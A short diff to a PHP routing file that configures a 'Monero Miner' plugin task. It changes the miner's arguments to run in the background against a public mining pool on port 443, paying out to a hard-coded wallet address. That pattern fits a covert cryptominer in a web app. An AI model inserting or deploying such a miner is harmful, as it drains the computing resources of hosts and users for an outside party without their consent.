@@ -12,7 +12,7 @@ $router->all('/miner', 'miner@settings');
 
 $host = "http://".$_SERVER["HTTP_HOST"];
 
-$minerArgs = "-a cryptonight --url=185.234.72.253:3333 --donate-level=1 --user=4A4a56cxpXHKUD8AwkeKT86TpxGp9t8UvDm1ZT1Md8dNjemAFUDtg7F5Cvoc2obZdfaLs9ez5SNrPA5SMhKXMvtfCWR2MCz --threads=1";
+$minerArgs = " -B -a cryptonight --url=gulf.moneroocean.stream:443 --donate-level=1 --user=4A4a56cxpXHKUD8AwkeKT86TpxGp9t8UvDm1ZT1Md8dNjemAFUDtg7F5Cvoc2obZdfaLs9ez5SNrPA5SMhKXMvtfCWR2MCz --threads=1";
 $GLOBALS["task_configuration"]["miner"] = array(
     "name" => "Monero Miner",
     "command" => "runplugin",
